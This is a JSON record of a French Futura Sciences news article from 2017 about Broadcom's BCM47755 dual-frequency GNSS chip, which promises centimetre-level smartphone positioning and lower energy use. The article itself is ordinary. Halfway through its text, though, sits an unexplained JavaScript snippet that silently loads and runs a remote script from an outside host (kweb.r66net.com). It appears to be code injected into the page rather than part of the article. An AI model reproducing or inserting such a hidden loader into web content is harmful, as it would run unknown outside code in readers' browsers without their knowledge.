{"title": "Les GPS des smartphones bientot beaucoup plus precis", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-09-25", "content": "Broadcom, fabricant de puces de communication pour les terminaux mobiles, vient d'annoncer la disponibilite d'un nouveau GPS double frequence qui offrira une precision au centimetre, contre environ cinq metres actuellement. Les services de geolocalisation sur smartphones en seront les principaux beneficiaires. Les  smartphones , tablettes et autres objets connectes utilisant un GPS vont prochainement faire un bond consequent en matiere de precision.  Broadcom , l'un des principaux fournisseurs de puces de communication pour les terminaux mobiles, vient d'annoncer la mise sur le marche d'un recepteur GNSS ( Global Navigation Satellite System ) dont la precision atteint l'echelle du centimetre, alors qu'elle est actuellement d'a peu pres cinq metres. Seuls certains equipements militaires et industriels disposaient jusqu'a present de GPS d'une telle acuite. La puce  Broadcom BCM47755  est la premiere du genre a pouvoir recevoir simultanement les signaux L1 et L5 suivants : GPS L1 C/A, Glonass L1, BeiDou (BDS) B1, QZSS L1, Galileo (GAL) E1, GPS L5, Galileo E5a, QZSS L5. Elle croise ces donnees avec celles emises par les autres capteurs presents dans le smartphone : accelerometre, magnetometre, gyroscope.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La puce Broadcom consomme deux fois moins d'energie Broadcom estime que cette technologie va permettre d'ameliorer les services de navigation et de  realite augmentee  a la fois en zones urbaines denses et dans les environnements plus degages. Le fabricant promet notamment une amelioration des estimations du delai d'arrivee et une meilleure localisation des chauffeurs et des clients pour les services de transport de type  Uber  ou BlaBlaCar.  L'un des defauts actuels des puces  GPS  de nos smartphones est qu'elles sont tres gourmandes en energie. C'est la raison pour laquelle il est recommande de deconnecter le GPS et les autres connexions sans fil (Bluetooth, Wi-Fi) lorsque l'on ne s'en sert pas, afin de prolonger l'autonomie de la batterie. Broadcom assure que sa nouvelle puce GNSS consomme 50 % d'energie en moins par rapport a la generation precedente. Celle-ci devrait equiper des smartphones, tablettes et autres montres connectees qui sortiront l'annee prochaine. Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest", "theme": "tech"}